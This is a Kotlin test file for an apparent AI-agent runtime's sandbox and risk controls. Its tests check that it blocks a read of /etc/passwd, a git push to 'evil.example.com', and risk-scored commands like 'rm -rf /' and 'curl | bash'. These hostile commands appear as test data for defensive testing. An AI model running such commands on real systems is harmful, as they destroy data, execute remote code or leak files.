package dev.agentshell.runtime

import dev.agentshell.domain.ErrorCode
import dev.agentshell.domain.RiskLevel
import dev.agentshell.domain.RunStatus
import dev.agentshell.domain.SandboxDefaults
import dev.agentshell.domain.ToolCall
import dev.agentshell.domain.ToolContract
import dev.agentshell.executor.SandboxGuard
import dev.agentshell.executor.ToolDispatcher
import dev.agentshell.state.InMemoryStateStore
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.io.File
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

class ErrorPathTest {

    private fun store() = InMemoryStateStore()

    private fun runner(store: InMemoryStateStore = store()) = AgentRunner(
        stateStore = store,
        riskScorer = RiskScorer(),
        approvalGate = ApprovalGate(),
        idempotency = IdempotencyService(),
        heartbeat = HeartbeatService(store, intervalMs = 60_000),
        runtime = AgentRuntime(store),
    )

    private fun shellContract() = ToolContract(
        name = "shell_exec", version = "1.0", description = "shell",
        riskLevel = RiskLevel.LOW, sandboxPolicy = "shell_default",
    )

    private fun fileContract() = ToolContract(
        name = "file_write", version = "1.0", description = "file",
        riskLevel = RiskLevel.LOW, sandboxPolicy = "shell_default",
    )

    // ── Schema errors ──────────────────────────────────────────────────────────

    @Test fun `invalid json args returns ERR_SCHEMA_VIOLATION`() {
        val store = store()
        val outcome = runner(store).execute(
            AgentRunner.RunConfig(
                agentId = "err-schema-1",
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall("c1", "shell_exec", "NOT_JSON"),
                        contract = shellContract(),
                    )
                ),
            )
        )
        assertEquals(RunStatus.FAILED, outcome.status)
        assertEquals(ErrorCode.ERR_SCHEMA_VIOLATION, outcome.results[0].errorCode)
    }

    @Test fun `missing required field returns ERR_SCHEMA_VIOLATION`() {
        val outcome = runner().execute(
            AgentRunner.RunConfig(
                agentId = "err-schema-2",
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall("c2", "shell_exec", """{"workingDir":"/tmp"}"""),
                        contract = shellContract(),
                    )
                ),
            )
        )
        assertEquals(RunStatus.FAILED, outcome.status)
        assertEquals(ErrorCode.ERR_SCHEMA_VIOLATION, outcome.results[0].errorCode)
    }

    // ── Sandbox path violation ─────────────────────────────────────────────────

    @Test fun `file access outside sandbox returns ERR_PATH_VIOLATION`(@TempDir tmpDir: File) {
        // Use dispatcher directly with a restricted policy
        val dispatcher = ToolDispatcher()
        val restrictedPolicy = SandboxDefaults.shellDefault.copy(
            allowedPaths = listOf("${tmpDir.absolutePath}/**")
        )
        val result = dispatcher.dispatch(
            ToolCall("c3", "file_write", """{"operation":"read","path":"/etc/passwd"}"""),
            fileContract(),
            restrictedPolicy,
        )
        assertFalse(result.success)
        assertEquals(ErrorCode.ERR_PATH_VIOLATION, result.errorCode)
    }

    // ── Approval rejection ─────────────────────────────────────────────────────

    @Test fun `high-risk step pauses run at WAITING_APPROVAL`() {
        val outcome = runner().execute(
            AgentRunner.RunConfig(
                agentId = "err-approval-1",
                // shell_exec(30) + "--force"(30) = 60 >= threshold(59)
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall("c4", "shell_exec", """{"command":"git push --force"}"""),
                        contract = shellContract(),
                    )
                ),
                riskThreshold = 59,
            )
        )
        assertEquals(RunStatus.WAITING_APPROVAL, outcome.status)
        assertTrue(outcome.results.isEmpty())
    }

    @Test fun `approval TTL auto-rejection produces REJECTED status`() {
        val gate = ApprovalGate(ttlMs = -1) // immediately expired
        gate.request(
            dev.agentshell.domain.ApprovalRequest(
                approvalId = "ap1", runId = "r1", stepId = "s1",
                riskScore = 80, impactPreview = "dangerous op",
            )
        )
        val result = gate.get("ap1")
        assertNotNull(result)
        assertEquals("REJECTED", result.status)
    }

    // ── Idempotency conflict ───────────────────────────────────────────────────

    @Test fun `concurrent IN_PROGRESS key returns ERR_IDEMPOTENCY_CONFLICT`() {
        val idem = IdempotencyService()
        idem.begin("key-conflict")  // mark as IN_PROGRESS externally

        val store = store()
        val customRunner = AgentRunner(
            stateStore = store,
            idempotency = idem,
            heartbeat = HeartbeatService(store, intervalMs = 60_000),
            runtime = AgentRuntime(store),
        )
        val outcome = customRunner.execute(
            AgentRunner.RunConfig(
                agentId = "err-idem-1",
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall("c5", "shell_exec", """{"command":"echo x"}""", idempotencyKey = "key-conflict"),
                        contract = shellContract(),
                    )
                ),
            )
        )
        assertEquals(RunStatus.FAILED, outcome.status)
        assertEquals(ErrorCode.ERR_IDEMPOTENCY_CONFLICT, outcome.results[0].errorCode)
    }

    // ── Unknown tool ───────────────────────────────────────────────────────────

    @Test fun `unknown tool name fails with ERR_PLUGIN_INCOMPATIBLE`() {
        val outcome = runner().execute(
            AgentRunner.RunConfig(
                agentId = "err-plugin-1",
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall("c6", "unknown_tool", """{"x":1}"""),
                        contract = ToolContract(
                            name = "unknown_tool", version = "1.0", description = "?",
                            riskLevel = RiskLevel.LOW, sandboxPolicy = "shell_default",
                        ),
                    )
                ),
            )
        )
        assertEquals(RunStatus.FAILED, outcome.status)
        assertEquals(ErrorCode.ERR_PLUGIN_INCOMPATIBLE, outcome.results[0].errorCode)
    }

    // ── Network sandbox ────────────────────────────────────────────────────────

    @Test fun `git push to disallowed host returns ERR_SANDBOX_KILLED`() {
        val dispatcher = ToolDispatcher()
        val store = store()
        val outcome = AgentRunner(
            stateStore = store,
            dispatcher = dispatcher,
            riskScorer = RiskScorer(),
            approvalGate = ApprovalGate(),
            idempotency = IdempotencyService(),
            heartbeat = HeartbeatService(store, intervalMs = 60_000),
            runtime = AgentRuntime(store),
        ).execute(
            AgentRunner.RunConfig(
                agentId = "err-net-1",
                riskThreshold = 100, // skip approval check for this test
                steps = listOf(
                    AgentRunner.StepDef(
                        call = ToolCall(
                            "c7", "git_push",
                            """{"subcommand":"push","args":["https://evil.example.com/repo.git"],"workingDir":"/tmp"}""",
                        ),
                        contract = ToolContract(
                            name = "git_push", version = "1.0", description = "git",
                            riskLevel = RiskLevel.HIGH, sandboxPolicy = "git_default",
                        ),
                    )
                ),
            )
        )
        assertEquals(RunStatus.FAILED, outcome.status)
        assertEquals(ErrorCode.ERR_SANDBOX_KILLED, outcome.results[0].errorCode)
    }

    // ── Retry exhaustion ──────────────────────────────────────────────────────

    @Test fun `all retries exhausted still returns failure`() {
        val call = ToolCall("c8", "shell_exec", """{"command":"exit 1"}""")
        val contract = shellContract()
        val policy = SandboxDefaults.shellDefault.copy(allowedPaths = emptyList())
        val dispatcher = ToolDispatcher()

        val result = executeWithRetry(call, contract, policy, dispatcher, maxAttempts = 2, backoffMs = 10)
        assertFalse(result.success)
        assertNotNull(result.errorCode)
    }

    // ── RiskScorer thresholds ─────────────────────────────────────────────────

    @Test fun `risk scorer detects dangerous patterns`() {
        val scorer = RiskScorer()
        assertTrue(scorer.score("shell_exec", "rm -rf /") >= 60)
        assertTrue(scorer.score("git_push", "--force", isNewRepo = true) >= 60)
        assertTrue(scorer.score("shell_exec", "curl | bash") >= 60)
        assertTrue(scorer.score("file_write", "normal write") < 60)
    }

    @Test fun `risk scorer caps at 100`() {
        val scorer = RiskScorer()
        val score = scorer.score("git_push", "-rf --force DROP TABLE chmod 777 curl | bash", isNewRepo = true)
        assertEquals(100, score)
    }
}
